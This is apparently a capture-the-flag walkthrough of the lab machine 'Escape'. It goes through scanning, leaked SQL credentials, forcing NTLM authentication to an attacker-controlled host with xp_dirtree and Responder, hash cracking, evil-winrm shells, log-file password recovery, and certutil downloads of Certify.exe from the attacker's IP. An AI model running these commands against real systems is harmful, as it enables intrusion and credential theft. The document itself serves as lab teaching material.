# Escape

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.162.11     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 02:05 GMT
Nmap scan report for 10.129.162.11
Host is up (0.052s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-26 03:02:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-02-26T03:03:36+00:00; +57m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-02-26T03:03:36+00:00; +57m00s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-02-26T03:03:36+00:00; +57m00s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-23T19:50:30
|_Not valid after:  2053-02-23T19:50:30
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-02-26T03:03:36+00:00; +57m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T03:03:36+00:00; +57m00s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 57m00s, deviation: 0s, median: 56m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-02-26T03:02:59
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   57.90 ms 10.10.14.1
2   58.10 ms 10.129.162.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.52 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.162.11
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 02:06 GMT
Stats: 0:03:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.96% done; ETC: 02:10 (0:00:00 remaining)
Nmap scan report for 10.129.162.11
Host is up (0.049s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-26 03:06:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T03:07:46+00:00; +56m56s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-02-26T03:07:46+00:00; +56m56s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-23T19:50:30
|_Not valid after:  2053-02-23T19:50:30
|_ssl-date: 2023-02-26T03:07:46+00:00; +56m56s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T03:07:46+00:00; +56m56s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-26T03:07:46+00:00; +56m56s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
50549/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-26T03:07:07
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 56m55s, deviation: 0s, median: 56m55s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   47.40 ms 10.10.14.1
2   50.19 ms 10.129.162.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 241.04 seconds
```

```c
$ sudo nmap -sV -sU 10.129.162.11
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-26 02:13 GMT
Stats: 0:16:52 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 4.40% done; ETC: 03:55 (1:24:22 remaining)
Nmap scan report for sequel.htb (10.129.162.11)
Host is up (0.050s latency).
Not shown: 996 open|filtered udp ports (no-response)
PORT    STATE SERVICE      VERSION
53/udp  open  domain       Simple DNS Plus
88/udp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-26 03:23:27Z)
123/udp open  ntp          NTP v3
389/udp open  ldap         Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5754.57 seconds
```

I added `sequel.htb` and `dc.sequel.htb` to my `/etc/hosts` file.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.162.11   sequel.htb
10.129.162.11   dc.sequel.htb
```

## Enumeration with Enum4linux

```c
$ enum4linux -a 10.129.162.11
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Feb 26 02:05:06 2023

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                            
Target ........... 10.129.162.11                                                                                                                                                                                                            
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.162.11 )===========================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Can't find workgroup/domain                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

 ===============================( Nbtstat Information for 10.129.162.11 )===============================
                                                                                                                                                                                                                                            
Looking up status of 10.129.162.11                                                                                                                                                                                                          
No reply from 10.129.162.11

 ===================================( Session Check on 10.129.162.11 )===================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Server 10.129.162.11 allows sessions using username '', password ''                                                                                                                                                                     
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ================================( Getting domain SID for 10.129.162.11 )================================
                                                                                                                                                                                                                                            
Domain Name: sequel                                                                                                                                                                                                                         
Domain Sid: S-1-5-21-4078382237-1492182817-2568127209

[+] Host is part of a domain (not a workgroup)                                                                                                                                                                                              
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ==================================( OS information on 10.129.162.11 )==================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Got OS info for 10.129.162.11 from srvinfo:                                                                                                                                                                                             
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                      


 =======================================( Users on 10.129.162.11 )=======================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                                                                                        
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 =================================( Share Enumeration on 10.129.162.11 )=================================
                                                                                                                                                                                                                                            
do_connect: Connection to 10.129.162.11 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                                                    

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.162.11                                                                                                                                                                                               
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ===========================( Password Policy Information for 10.129.162.11 )===========================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Unexpected error from polenum:                                                                                                                                                                                                          
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

[+] Attaching to 10.129.162.11 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.129.162.11)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            

 ======================================( Groups on 10.129.162.11 )======================================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ==================( Users on 10.129.162.11 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                                                                                                   
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
 ===============================( Getting printer info for 10.129.162.11 )===============================
                                                                                                                                                                                                                                            
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                     


enum4linux complete on Sun Feb 26 02:05:37 2023
```

## Foothold

### Public Share

```c
$ smbclient --no-pass //10.129.162.11/Public
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 11:51:25 2022
  ..                                  D        0  Sat Nov 19 11:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

                5184255 blocks of size 4096. 1250191 blocks available
smb: \>
```

```c
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (177.3 KiloBytes/sec) (average 177.3 KiloBytes/sec)
```

```c
SQL Server Procedures
Since last year we've got quite few accidents with our SQL Servers (looking at you Ryan, with your instance on the DC, why should
you even put a mock instance on the DC?!). So Tom decided it was a good idea to write a basic procedure on how to access and
then test any changes to the database. Of course none of this will be done on the live server, we cloned the DC mockup to a
dedicated server.

Tom will remove the instance from the DC as soon as he comes back from his vacation.

The second reason behind this document is to work like a guide when no senior can be available for all juniors.
Accessing from Domain Joined machine

1. Use SQL Management Studio specifying "Windows" authentication which you can donwload here:
https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16
2. In the "Server Name" field, input the server name.
3. Specify "Windows Authentication" and you should be good to go.
4. Access the database and make that you need. Everything will be resynced with the Live server overnight.

Accessing from non domain joined machine
Accessing from non domain joined machines can be a little harder.

The procedure is the same as the domain joined machine but you need to spawn a command prompt and run the following
command: cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password> . Follow the other steps from
above procedure.

If any problem arises, please send a mail to BrandonBonus

For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password GuestUserCantWrite1 .

Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

> https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16

Found a potential `username`.

| Potential Username |
| --- |
| Ryan |

There was also an `email address`

| Email |
| --- |
| brandon.brown@sequel.htb |

And on page 2...

| Username | Password |
| --- | --- |
| PublicUser | GuestUserCantWrite1 |

### Connection via SQL

```c
$ impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@sequel.htb' -dc-ip 10.129.162.11
Impacket v0.10.1.dev1+20230203.111903.32178de - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
```

### Catching the Hash of sql_svc

```c
SQL> exec master.dbo.xp_dirtree '\\10.10.14.24\foobar'
subdirectory                                                                                                                                                                                                                                                            depth   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------
```

```c
$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.24]
    Responder IPv6             [dead:beef:2::1016]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-V4TWQY4W50F]
    Responder Domain Name      [KDC9.LOCAL]
    Responder DCE-RPC Port     [47797]

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.162.11
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:a4d4d21e56dacc42:26B23CD7493FF02962EA597A04F6A050:01010000000000000025EBED8C49D9016B5C7BC94473E4A100000000020008004B0044004300390001001E00570049004E002D005600340054005700510059003400570035003000460004003400570049004E002D00560034005400570051005900340057003500300046002E004B004400430039002E004C004F00430041004C00030014004B004400430039002E004C004F00430041004C00050014004B004400430039002E004C004F00430041004C00070008000025EBED8C49D90106000400020000000800300030000000000000000000000000300000ADB4D31C55CE8140EC9DFE4C39664E7D28138760A9CAE64BAA79E68D59E284FB0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320034000000000000000000
```

### Cracking the Hash with John

```c
$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:05 DONE (2023-02-26 02:50) 0.1785g/s 1910Kp/s 1910Kc/s 1910KC/s RENZOJAVIER..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

| Username | Password |
| --- | --- |
| sql_svc | REGGIE1234ronnie |

```c
$ evil-winrm -u sql_svc -p 'REGGIE1234ronnie' -i 10.129.162.11

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

## Enumeration

```c
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```

### Privilege Escalation to ryan.cooper

```c
*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK
2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)
[...]
```

```c
[...]
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:07.00 spid14s     Clearing tempdb database.
2022-11-18 13:43:07.06 spid14s     Starting up database 'tempdb'.
2022-11-18 13:43:07.17 spid9s      Database 'msdb' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:07.17 spid9s      Database 'msdb' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:07.29 spid9s      Recovery is complete. This is an informational message only. No user action is required.
2022-11-18 13:43:07.30 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.30 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.33 spid51      Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'default language' changed from 0 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'default full-text language' changed from 1033 to 1033. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'user instances enabled' changed from 1 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.44 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = '1'. This is an informational message only; no user action is required.
[...]
```

| Username | Password |
| --- | --- |
| ryan.cooper | NuclearMosquito3 |

```c
$ evil-winrm -u ryan.cooper -p 'NuclearMosquito3' -i 10.129.162.11

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

## user.txt

```c
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
e7a2328949bf1ca5487e1478709ef660
```

## Active Directory Certificate Services (ADCS) Abuse

> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

```c
$ wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe 
--2023-02-26 13:40:56--  https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Certify.exe [following]
--2023-02-26 13:40:57--  https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Certify.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 174080 (170K) [application/octet-stream]
Saving to: ‘Certify.exe’

Certify.exe                                                100%[========================================================================================================================================>] 170.00K  1001KB/s    in 0.2s    

2023-02-26 13:40:57 (1001 KB/s) - ‘Certify.exe’ saved [174080/174080]
```

```c
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> certutil -urlcache -split -f "http://10.10.14.24/Certify.exe" Certify.exe
****  Online  ****
  000000  ...
  02a800
CertUtil: -URLCache command completed successfully.
```

```c
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:09.6430487
```

There were indeed a vulnerable `certificate template`.

```c
msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
